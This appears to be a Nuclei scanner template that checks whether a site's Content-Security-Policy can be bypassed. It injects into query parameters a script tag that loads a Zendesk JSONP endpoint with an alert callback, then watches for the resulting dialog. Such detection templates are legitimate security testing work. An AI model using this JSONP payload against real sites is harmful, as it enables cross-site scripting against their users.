id: zendesk-support-csp-bypass

info:
  name: Content-Security-Policy Bypass via Zendesk Support
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,zendesk-support

flow: http(1) && headless(1)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        part: header
        words:
          - "Content-Security-Policy"
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: zendesk_support_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "zendesk_support_csp_xss == true"
